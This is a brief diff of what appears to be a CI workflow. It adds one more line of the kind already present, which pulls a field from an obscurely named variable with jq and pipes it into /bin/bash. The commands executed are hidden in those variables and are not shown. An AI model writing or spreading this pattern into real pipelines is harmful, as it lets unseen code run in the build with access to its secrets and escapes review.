@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$h0998" | jq -r .ds2306 | /bin/bash
           echo $f9394 | jq -r .c435 | /bin/bash
           echo $r6827 | jq -r .hkel761 | /bin/bash
+          printf '%s' "$o9" | jq -r .iuix1 | /bin/bash
 
       - name: Upload results
         if: always()
